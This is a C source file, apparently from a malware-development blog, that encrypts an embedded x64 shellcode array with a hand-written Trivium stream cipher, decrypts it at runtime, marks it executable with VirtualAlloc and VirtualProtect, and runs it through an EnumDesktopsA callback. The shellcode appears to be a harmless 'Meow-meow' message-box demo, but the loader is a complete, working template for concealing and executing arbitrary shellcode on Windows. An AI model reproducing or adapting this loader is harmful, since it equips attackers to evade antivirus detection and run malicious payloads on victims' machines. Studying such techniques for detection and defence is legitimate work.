/*
 * hack2.c - Trivium payload encryption and decryption
 * author: @cocomelonc
 * https://cocomelonc.github.io/malware/2026/11/27/malware-cryptography-47.html
 */

#include <stdint.h>
#include <stdio.h>
#include <string.h>

#include <windows.h>

#define STATE_BITS 288
#define KEY_BYTES 10
#define IV_BYTES 10

static const uint8_t payload[] =
  "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
  "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
  "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
  "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
  "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
  "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
  "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
  "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
  "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
  "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
  "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
  "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
  "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
  "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
  "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
  "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
  "\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
  "\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
  "\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
  "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
  "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
  "\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
  "\x2e\x2e\x5e\x3d\x00";

static uint8_t trivium_clock(uint8_t state[STATE_BITS]) {
  uint8_t t1 = state[65] ^ state[92];
  uint8_t t2 = state[161] ^ state[176];
  uint8_t t3 = state[242] ^ state[287];
  uint8_t output = t1 ^ t2 ^ t3;

  t1 ^= (state[90] & state[91]) ^ state[170];
  t2 ^= (state[174] & state[175]) ^ state[263];
  t3 ^= (state[285] & state[286]) ^ state[68];

  for (int i = 92; i > 0; i--) state[i] = state[i - 1];
  state[0] = t3;

  for (int i = 176; i > 93; i--) state[i] = state[i - 1];
  state[93] = t1;

  for (int i = 287; i > 177; i--) state[i] = state[i - 1];
  state[177] = t2;

  return output;
}

static void trivium_crypt(uint8_t *data, size_t length,
  const uint8_t key[KEY_BYTES],
  const uint8_t iv[IV_BYTES]) {
  uint8_t state[STATE_BITS] = {0};

  for (int i = 0; i < 80; i++) {
    state[i] = (key[9 - i / 8] >> (7 - i % 8)) & 1;
    state[i + 93] = (iv[9 - i / 8] >> (7 - i % 8)) & 1;
  }
  state[285] = 1;
  state[286] = 1;
  state[287] = 1;

  for (int i = 0; i < 4 * STATE_BITS; i++) trivium_clock(state);

  for (size_t i = 0; i < length; i++) {
    uint8_t stream_byte = 0;
    for (int bit = 0; bit < 8; bit++)
      stream_byte |= trivium_clock(state) << bit;
    data[i] ^= stream_byte;
  }
}

static int check_test_vector(void) {
  const uint8_t key[KEY_BYTES] = {0x80};
  const uint8_t iv[IV_BYTES] = {0};
  const uint8_t expected[16] = {
    0x38, 0xeb, 0x86, 0xff, 0x73, 0x0d, 0x7a, 0x9c,
    0xaf, 0x8d, 0xf1, 0x3a, 0x44, 0x20, 0x54, 0x0d
  };
  uint8_t output[sizeof(expected)] = {0};

  trivium_crypt(output, sizeof(output), key, iv);
  return memcmp(output, expected, sizeof(expected)) == 0;
}

static void print_hex(const char *label, const uint8_t *data, size_t length) {
  printf("%s", label);
  for (size_t i = 0; i < length; i++) {
    printf("%02x", data[i]);
    if ((i + 1) % 16 == 0 || i + 1 == length) printf("\n");
    else printf(" ");
  }
}

int main(void) {
  static const uint8_t key[KEY_BYTES] = {
    0x10, 0x32, 0x54, 0x76, 0x98, 0xba, 0xdc, 0xfe, 0x01, 0x23
  };
  static const uint8_t iv[IV_BYTES] = {
    0xa0, 0x91, 0x82, 0x73, 0x64, 0x55, 0x46, 0x37, 0x28, 0x19
  };

  if (!check_test_vector()) {
    fprintf(stderr, "Trivium test vector failed\n");
    return 1;
  }
  puts("Trivium eSTREAM test vector: OK");

  const size_t payload_length = sizeof(payload) - 1;
  uint8_t encrypted[sizeof(payload) - 1];
  uint8_t decrypted[sizeof(payload) - 1];

  memcpy(encrypted, payload, payload_length);
  trivium_crypt(encrypted, payload_length, key, iv);
  memcpy(decrypted, encrypted, payload_length);
  trivium_crypt(decrypted, payload_length, key, iv);
  if (memcmp(decrypted, payload, payload_length) != 0) {
    fprintf(stderr, "payload decryption failed\n");
    return 1;
  }

  print_hex("decrypted payload: ", decrypted, payload_length);
  printf("payload decryption: OK (%zu bytes)\n", payload_length);

  void *memory = VirtualAlloc(NULL, payload_length,
    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (memory == NULL) {
    fprintf(stderr, "VirtualAlloc failed\n");
    return 1;
  }
  memcpy(memory, decrypted, payload_length);

  DWORD old_protection;
  if (!VirtualProtect(memory, payload_length, PAGE_EXECUTE_READ,
    &old_protection)) {
    fprintf(stderr, "VirtualProtect failed\n");
    VirtualFree(memory, 0, MEM_RELEASE);
    return 1;
  }
  FlushInstructionCache(GetCurrentProcess(), memory, payload_length);

  puts("running Meow-meow payload");
  EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)memory, 0);
  VirtualFree(memory, 0, MEM_RELEASE);

  return 0;
}
